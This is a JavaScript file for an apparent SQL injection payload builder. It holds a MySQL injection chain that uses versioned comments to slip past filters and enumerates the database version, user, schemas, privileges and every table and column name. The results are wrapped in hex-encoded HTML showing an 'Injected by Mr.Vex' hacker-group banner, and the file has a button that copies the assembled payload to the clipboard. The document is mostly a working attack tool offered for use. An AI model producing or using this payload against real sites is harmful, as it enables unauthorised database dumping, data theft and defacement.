// Data array combining hex-string pairs and comments
const data = [
  { type: "comment", value: "/*!50000concat/**Darknet-Haxor**/*/(" },
  { type: "pair", hex: "0x223e273e3c2f7469746c653e", string: "\">'></title>" },
  { type: "pair", hex: "0x3c6c696e6b2072656c3d227374796c6573686565742220687265663d2268747470733a2f2f6b696d65747375616e647265612e6769746875622e696f2f70726f66696c652f7374796c652e6373732220747970653d22746578742f637373223e", string: "<link rel=\"stylesheet\" href=\"https://kimetsuandrea.github.io/profile/style.css\" type=\"text/css\">" },
  { type: "pair", hex: "0x3c62723e3c62723e3c2f666f6e743e3c7461626c6520626f726465723d2235223e3c74686561643e3c74723e3c746820636f6c7370616e3d2232223e3c6469762069643d2267756172646972616e2d6c6f676f223e3c696d6720647261676761626c653d2266616c736522207372633d2268747470733a2f2f692e696d6775722e636f6d2f576271385454432e6a706567222077696474683d31303030206865696768743d33303020616c743d22564f4944534543204841434b4552532e223e3c2f6469763e3c72207374796c653d22636f6c6f723a426c61636b223e564f4944534543204f52472e3c2f723e3c2f74683e3c2f74723e3c74723e3c746820636f6c7370616e3d2232223e3c683320616c69676e3d2263656e746572223e3c6e3e203c693e3c6d207374796c653d22636f6c6f723a726564223e496e6a6563746564206279", string: "<br><br></font><table border=\"5\"><thead><tr><th colspan=\"2\"><div id=\"guardiran-logo\"><img draggable=\"false\" src=\"https://i.imgur.com/Wbq8TTC.jpeg\" width=1000 height=300 alt=\"VOIDSEC HACKERS.\"></div><r style=\"color:Black\">VOIDSEC ORG.</r></th></tr><tr><th colspan=\"2\"><h3 align=\"center\"><n> <i><m style=\"color:red\">Injected by" },
  { type: "pair", hex: "0x3c2f6e3e3c693e3c6d207374796c653d22636f6c6f723a726564223e4d722e5665783c2f6d3e3c2f6d3e3c2f693e", string: "</n><i><m style=\"color:red\">Mr.Vex</m></m></i>" },
  { type: "pair", hex: "0x3c2f68333e3c2f74683e3c2f74723e", string: "</h3></th></tr>" },
  { type: "pair", hex: "0x3c74723e3c746820636f6c7370616e3d2232223e3c64697620616c69676e3d226c656674223e3c666f6e7420636f6c6f723d677265656e3e3c6e3e56657273696f6e202d2d3e3c2f6e3e3c666f6e7420636f6c6f723d626c75653e", string: "<tr><th colspan=\"2\"><div align=\"left\"><font color=green><n>Version --></n><font color=blue>" },
  { type: "comment", value: "/*!50000VerSiOn/**xnxx**/*/()" },
  { type: "pair", hex: "0x3c2f74683e3c2f74723e", string: "</th></tr>" },
  { type: "pair", hex: "0x3c74723e3c746820636f6c7370616e3d2232223e3c64697620616c69676e3d226c656674223e3c666f6e7420636f6c6f723d677265656e3e3c6e3e55736572202d2d3e3c2f6e3e3c666f6e7420636f6c6f723d626c75653e", string: "<tr><th colspan=\"2\"><div align=\"left\"><font color=green><n>User --></n><font color=blue>" },
  { type: "comment", value: "/*!50000UsEr/**Darknet-Haxor**/*/()" },
  { type: "pair", hex: "0x3c2f74683e3c2f74723e", string: "</th></tr>" },
  { type: "pair", hex: "0x3c74723e3c746820636f6c7370616e3d2232223e3c64697620616c69676e3d226c656674223e3c666f6e7420636f6c6f723d677265656e3e3c6e3e4461746162617365202d2d3e3c2f6e3e3c666f6e7420636f6c6f723d626c75653e", string: "<tr><th colspan=\"2\"><div align=\"left\"><font color=green><n>Database --></n><font color=blue>" },
  { type: "comment", value: "/*!50000DaTabaSe/**Darknet-Haxor**/*/()" },
  { type: "pair", hex: "0x3c2f74683e3c2f74723e", string: "</th></tr>" },
  { type: "pair", hex: "0x3c74723e3c746820636f6c7370616e3d2232223e3c64697620616c69676e3d2263656e746572223e3c666f6e7420636f6c6f723d7265643e3c6e3e546f74616c2044617461626173653c2f6e3e3c2f74723e3c2f74683e3c74723e3c746820636f6c7370616e3d2232223e", string: "<tr><th colspan=\"2\"><div align=\"center\"><font color=red><n>Total Database</n></tr></th><tr><th colspan=\"2\">" },
  { type: "comment", value: "(SeLECT(@w)/*!50000FrOM/**Darknet-Haxor**/*/(/*!50000SeLECT/**xnxx**/*/(@w:=0x00) ,(SeLECT(@w)/*!50000FrOM/**Darknet-Haxor**/*/(/*!50000InFOrMATIoN_SChEmA/**Darknet-Haxor**/*/.SCheMaTA)/*!50000WhErE/**Darknet-Haxor**/*/(@w)IN(@w:=/*!50000CoNCaT/**Darknet-Haxor**/*/(0x20,@w" },
  { type: "pair", hex: "0x3c64697620616c69676e3d226c656674223e3c666f6e7420636f6c6f723d626c75653e", string: "<div align=\"left\"><font color=blue>" },
  { type: "comment", value: "/*!50000sCheMa_NaMe/**Darknet-Haxor**/*/" },
  { type: "pair", hex: "0x3c62723e", string: "<br>" },
  { type: "comment", value: "))))w)" },
  { type: "pair", hex: "0x3c2f74683e3c2f74723e3c74723e3c746820636f6c7370616e3d2232223e3c64697620616c69676e3d2263656e746572223e3c666f6e7420636f6c6f723d7265643e3c6e3e557365722050726976696c6567653c2f6e3e3c2f74683e3c2f74723e3c74723e3c746820636f6c7370616e3d2232223e", string: "</th></tr><tr><th colspan=\"2\"><div align=\"center\"><font color=red><n>User Privilege</n></th></tr><tr><th colspan=\"2\">" },
  { type: "comment", value: "(SeLECT(@z)/*!50000FrOM/**Darknet-Haxor**/*/(/*!50000SeLECT/**xnxx**/*/(@z:=0x00) ,(SeLECT(@z)/*!50000FrOM/**Darknet-Haxor**/*/(/*!50000INFOrmATiON_SChEmA/**Darknet-Haxor**/*/.UsER_PRIViLEgES)/*!50000WhErE/**Darknet-Haxor**/*/(@z)IN(@z:=/*!50000CoNCaT/**Darknet-Haxor**/*/(0x20,@z" },
  { type: "pair", hex: "", string: "GrANtEE" },
  { type: "pair", hex: "0x202d3e20", string: " -> " },
  { type: "pair", hex: "", string: "Is_gRANTaBLE" },
  { type: "pair", hex: "0x3c62723e", string: "<br>" },
  { type: "comment", value: "))))z)" },
  { type: "pair", hex: "0x3c2f74683e3c2f74723e", string: "</th></tr>" },
  { type: "pair", hex: "0x3c2f74683e3c2f74723e3c74723e3c746820636f6c7370616e3d2232223e3c64697620616c69676e3d2263656e746572223e3c696d6720647261676761626c653d2266616c736522207372633d2268747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f4b696d65747375416e647265612f50726f66696c652f726566732f68656164732f6d61696e2f62616e6e65722e676966222077696474683d343630206865696768743d363020616c743d2244616b726e6574204861786f72205465616d223e3c2f74683e3c2f74723e3c74723e3c74683e3c64697620616c69676e3d2263656e746572223e3c666f6e7420636f6c6f723d7265643e5461626c65204e616d653c2f74683e3c74683e3c64697620616c69676e3d2263656e746572223e3c666f6e7420636f6c6f723d7265643e436f6c756d6e204e616d653c2f74683e3c2f74686561643e3c2f74723e3c74626f64793e", string: "</th></tr><tr><th colspan=\"2\"><div align=\"center\"><img draggable=\"false\" src=\"https://raw.githubusercontent.com/KimetsuAndrea/Profile/refs/heads/main/banner.gif\" width=460 height=60 alt=\"Dakrnet Haxor Team\"></th></tr><tr><th><div align=\"center\"><font color=red>Table Name</th><th><div align=\"center\"><font color=red>Column Name</th></thead></tr><tbody>" },
  { type: "comment", value: "(selEct(@x)/*!50000fRom/**Darknet-Haxor**/*/(/*!50000sElect/**Darknet-Haxor**/*/(@x:=0x00),( fract(0)/*!From/**Darknet-Haxor**/*/(/*!50000inforMation_schEma.coLuMns/**Darknet-Haxor**/*/)/*!50000Where/**Darknet-Haxor**/*/(taBle_schema=/*!50000DatAbase/**Darknet-Haxor**/*/())and(0x00)in(@x:=/*!50000coNcat/**Darknet-Haxor**/*/(@x" },
  { type: "pair", hex: "0x3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e", string: "</font></td><td><font color=red size=3>" },
  { type: "pair", hex: "0x3c64697620616c69676e3d226c656674223e", string: "<div align=\"left\">" },
  { type: "comment", value: "/*!50000tAble_naMe/**Darknet-Haxor**/*/" },
  { type: "pair", hex: "0x3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e", string: "</font></td><td><font color=red size=3>" },
  { type: "pair", hex: "0x3c64697620616c69676e3d226c656674223e", string: "<div align=\"left\">" },
  { type: "comment", value: "/*!50000colUmn_naMe/**Darknet-Haxor**/*/" },
  { type: "pair", hex: "0x3c2f666f6e743e3c2f74643e3c2f74723e", string: "</font></td></tr>" },
  { type: "comment", value: "))))x))" }
];

// Function to convert string to hex
function stringToHex(str) {
  let hex = '0x';
  for (let i = 0; i < str.length; i++) {
    const charCode = str.charCodeAt(i).toString(16).padStart(2, '0');
    hex += charCode;
  }
  return hex;
}

// Function to display all pairs and comments
function displayData() {
  const outputSection = document.getElementById('outputSection');
  outputSection.innerHTML = '';
  let pairIndex = 0;
  
  data.forEach((item) => {
    const div = document.createElement('div');
    if (item.type === 'pair') {
      div.className = 'pair';
      const currentHex = item.hex || stringToHex(item.string);
      div.innerHTML = `
                <div class="hex" id="hex-${pairIndex}">${currentHex}</div>
                <textarea class="string-holder" id="string-${pairIndex}" rows="2">${item.string}</textarea>
            `;
      outputSection.appendChild(div);
      
      // Add event listener for real-time hex update
      const textarea = div.querySelector(`#string-${pairIndex}`);
      const hexDisplay = div.querySelector(`#hex-${pairIndex}`);
      textarea.addEventListener('input', () => {
        hexDisplay.textContent = stringToHex(textarea.value);
      });
      pairIndex++;
    } else if (item.type === 'comment') {
      div.className = 'comment';
      div.textContent = item.value;
      outputSection.appendChild(div);
    }
  });
}

// Function to copy all hex codes and comments to clipboard
function copyAllContent() {
  let pairIndex = 0;
  const content = data
    .map((item) => {
      if (item.type === 'pair') {
        const textarea = document.getElementById(`string-${pairIndex}`);
        pairIndex++;
        return textarea ? stringToHex(textarea.value) : item.hex;
      } else {
        return item.value;
      }
    })
    .join(',');
  
  const wrappedContent = `(${content})`;
  
  navigator.clipboard.writeText(wrappedContent).then(() => {
    showToast();
  }).catch(err => {
    console.error('Failed to copy: ', err);
  });
}

// Function to show toast notification
function showToast() {
  const toast = document.getElementById('toast');
  toast.className = 'toast show';
  setTimeout(() => {
    toast.className = 'toast';
  }, 3000);
}

// Initialize display on page load
window.onload = displayData;